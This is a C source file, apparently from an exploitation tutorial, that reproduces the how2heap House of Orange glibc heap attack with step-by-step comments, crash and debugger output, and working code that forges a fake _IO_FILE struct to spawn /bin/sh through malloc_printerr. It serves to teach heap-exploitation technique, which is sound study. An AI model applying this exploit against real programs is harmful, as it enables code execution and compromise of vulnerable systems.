#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// This code is from: https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c
// I couldn't of figured out this attack without sufficient documentation
// I basically just added comments to it

void pwn(char *inp)
{
    system(inp);
}

void main(void)
{
    // So let's cover House of Orange
    // The purpose of House of Orange is to get code execution
    // We will be doing this by targeting the malloc_printerr function, which is the function that prints out info when it detects memory corruption
    // Like this:
    /*
    *** Error in `./t': double free or corruption (fasttop): 0x0000000001d12010 ***
    ======= Backtrace: =========
    /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fa510f817e5]
    /lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fa510f8a37a]
    /lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fa510f8e53c]
    ./t[0x400594]
    /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fa510f2a830]
    ./t[0x400499]
    ======= Memory map: ========
    00400000-00401000 r-xp 00000000 08:01 793068                             /Hackery/pod/modules/house_of_orange/house_orange_exp/t
    00600000-00601000 r--p 00000000 08:01 793068                             /Hackery/pod/modules/house_of_orange/house_orange_exp/t
    00601000-00602000 rw-p 00001000 08:01 793068                             /Hackery/pod/modules/house_of_orange/house_orange_exp/t
    01d12000-01d33000 rw-p 00000000 00:00 0                                  [heap]
    7fa50c000000-7fa50c021000 rw-p 00000000 00:00 0
    7fa50c021000-7fa510000000 ---p 00000000 00:00 0
    7fa510cf4000-7fa510d0a000 r-xp 00000000 08:01 397746                     /lib/x86_64-linux-gnu/libgcc_s.so.1
    7fa510d0a000-7fa510f09000 ---p 00016000 08:01 397746                     /lib/x86_64-linux-gnu/libgcc_s.so.1
    7fa510f09000-7fa510f0a000 rw-p 00015000 08:01 397746                     /lib/x86_64-linux-gnu/libgcc_s.so.1
    7fa510f0a000-7fa5110ca000 r-xp 00000000 08:01 397708                     /lib/x86_64-linux-gnu/libc-2.23.so
    7fa5110ca000-7fa5112ca000 ---p 001c0000 08:01 397708                     /lib/x86_64-linux-gnu/libc-2.23.so
    7fa5112ca000-7fa5112ce000 r--p 001c0000 08:01 397708                     /lib/x86_64-linux-gnu/libc-2.23.so
    7fa5112ce000-7fa5112d0000 rw-p 001c4000 08:01 397708                     /lib/x86_64-linux-gnu/libc-2.23.so
    7fa5112d0000-7fa5112d4000 rw-p 00000000 00:00 0
    7fa5112d4000-7fa5112fa000 r-xp 00000000 08:01 397680                     /lib/x86_64-linux-gnu/ld-2.23.so
    7fa5114db000-7fa5114de000 rw-p 00000000 00:00 0
    7fa5114f8000-7fa5114f9000 rw-p 00000000 00:00 0
    7fa5114f9000-7fa5114fa000 r--p 00025000 08:01 397680                     /lib/x86_64-linux-gnu/ld-2.23.so
    7fa5114fa000-7fa5114fb000 rw-p 00026000 08:01 397680                     /lib/x86_64-linux-gnu/ld-2.23.so
    7fa5114fb000-7fa5114fc000 rw-p 00000000 00:00 0
    7fff06ae4000-7fff06b05000 rw-p 00000000 00:00 0                          [stack]
    7fff06b99000-7fff06b9c000 r--p 00000000 00:00 0                          [vvar]
    7fff06b9c000-7fff06b9e000 r-xp 00000000 00:00 0                          [vdso]
    ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
    Aborted (core dumped)
    */

    // Thing is, in older versions of libc, when the function was called it would iterate through a list of
    // _IO_FILE structs stored in _IO_list_all, and actually execute an instruction pointer in that struct
    // This attack will forge a fake _IO_FILE struct that we will write to _IO_list_all, and cause malloc_printerr to run
    // Then it will execute whatever address we have stored in the _IO_FILE structs jump table, and we will get code execution

    // There are several benefits to how we are going to do this
    // First off, with how we do this, we won't ever need to call free directly in the code
    // We will need a libc and heap infoleak to execute this attack
    // In addition to that, we will need a heap overflow that will allow us to reach the top chunk
    // Also this works on versions of libc earlier than 2.26
    // Let's get started!


    // So starting off we will allocate a chunk off of the top chunk.
    // The top chunk is the heap chunk which contains data which hasn't been allocated yet
    // Malloc will allocate data off from this chunk when it can't find chunks from any of the bin lists
    // This call to malloc will set up the heap for us

    unsigned long *ptr, *topChunk;

    // Actual Size of chunk will be 0x400, because of heap metadata
    ptr = malloc(0x3f0);

    // Now the reason why we allocated a chunk that will be 0x400, is due to the top chunk
    // Now the top chunk is usually allocated with a size of 0x21000
    // After that allocation, the size of the top chunk has (0x21000 - 0x400) | 1 = 0x20c01

    // Now we will use the heap overflow to overwrite the size value of the top chunk
    // We will write to it 0xc01, which is a lesser value
    // That way we can cause the behavior in which it increases the top chunk (will be talked about later)
    // We put it's size as `0xc01` for two reasons
    // The first is that it the previous in use bit needs to be set (the 0x1), because if the previous block wasn't in use there should be a consolidation
    // The second is that the size of the top chunk plus the size of the chunk in this case needs to be paged aligned
    // Being page aligned means that the address starts at the start of a memory page

    // However first let's use the heap pointer we have to calculate the address of the top chunk, by adding an offset to it (we can find this offset in a debugger)

    topChunk = (unsigned long *) ((char *)ptr + 0x3f0);

    // Now let's set the size of the top chunk

    topChunk[1] = 0xc01;

    // Now that we have shrunk the size value, we will allocate a chunk size of 0x1000
    // Since the requested size is bigger than the size of the top chunk, the top chunk will be expanded
    // This is done in one of two ways, either by allocating another page with mmap, or extending the top chunk via allocating more memory with brk
    // If the size requested is less than 0x21000, then the brk method is used

    // When this is done sysmalloc will be invoked
    // The new memory will be allocated at the end of the current top chunk, and the old top chunk will be freed
    // This will cause it to enter into the unsorted bin (even though we never directly called free)
    // Assuming that we still have the heap overflow of the old top chunk, this will give us an overflow of an unsorted bin chunk

    /*
        Before 0x1000 Allocation
        +-----+-------------+
        | ptr |  top chunk  | < end of heap right there
        +-----+-------------+


        After 0x1000 Allocation
        +-----+----------------+---------------+
        | ptr |  old top chunk | New Top Chunk | < end of heap right there
        |     |  (now freed)   |               |
        +-----+----------------+---------------+
    */

    malloc(0x1000);

    // Now that our old top chunk is the only chunk in the unsorted bin, it has libc pointers in it
    // We will simulate a libc infoleak, and use it to calculate the address of _IO_list_all

    unsigned long _IO_list_all;
    _IO_list_all = topChunk[2] + 0x9a8;

    // Now we will prep for an unsorted bin attack here
    // For this, we will write to the first value in _IO_list_all the start of the unsorted bin, main_arena+88
    // This value is a ptr to the first chunk in the unsorted bin, which will be the old top chunk we have an overflow to
    // In this case this chunk gets split up to serve allocation requests (which it will) the bk chunk's fwd pointer gets overwritten with the unsorted bin list
    // In other words topChunk->bk->fwd = unsorted bin list (which is a ptr to the old top chunk)

    topChunk[3] = _IO_list_all - 0x10;

    // Now the next thing we will need to set is the size of the old top chunk
    // We will shrink it down to the size of a small bin chunk, specifically 0x61
    // This will serve two purposes
    // When malloc scans through the unsorted bin and sees this chunk, it will try to insert it into small bin 4 due to its size
    // So this chunk will also end up at the head of the small bin 4 list, as we can see here in memory:

    /*
    gef➤  x/10g 0x7ffff7dd1b78
    0x7ffff7dd1b78 <main_arena+88>:    0x624010    0x0
    0x7ffff7dd1b88 <main_arena+104>:    0x602400    0x7ffff7dd2510
    0x7ffff7dd1b98 <main_arena+120>:    0x7ffff7dd1b88    0x7ffff7dd1b88
    0x7ffff7dd1ba8 <main_arena+136>:    0x7ffff7dd1b98    0x7ffff7dd1b98
    0x7ffff7dd1bb8 <main_arena+152>:    0x7ffff7dd1ba8    0x7ffff7dd1ba8
    gef➤  x/4g 0x6023f0
    0x6023f0:    0x0    0x0
    0x602400:    0x68732f6e69622f    0x61
    */

    // This will give us a wrote to the fwd pointer of the value we will write to _IO_list_all (which so happens to overlap with small bin 4), since currently our only write is an unsorted bin attack
    // Also this will cause it to fail a check, when it checks the size of the false fwd chunk (which will be 0), which will cause malloc_printerr to be called

    topChunk[1] = 0x61;


    // Now we will finally set up the _IO_FILE struct, which will overlap with the old top chunk currently in the unsorted bin
    // However the first 8 bytes, we will write our input a pointer to it will be passed to the instruction pointer we are calling

    memcpy(topChunk, "/bin/sh", 8);

    // Now for the fake _IO_FILE struct

    _IO_FILE *fakeFp = (_IO_FILE *) topChunk;

    // Set mode to 0
    fakeFp->_mode = 0;

    // Set the write base to 2, and the write ptr to 3
    // We have to pass the check the the write ptr is greater than the write base

    fakeFp->_IO_write_base = (char *) 2;
    fakeFp->_IO_write_ptr = (char *) 3;    

    // Next up we make our jump table
    // This is where our instruction pointer will be called
    // In here I will be setting the instruction pointer equal to the address of pwn
    // However since we have a libc infoleak, we in practice could just set it to system

    unsigned long *jmpTable = &topChunk[12];
    jmpTable[3] = (unsigned long) &pwn;
    *(unsigned long *) ((unsigned long) fakeFp + sizeof(_IO_FILE)) = (unsigned long) jmpTable;

    // Now call malloc to cause this attack to execute

    malloc(10);
}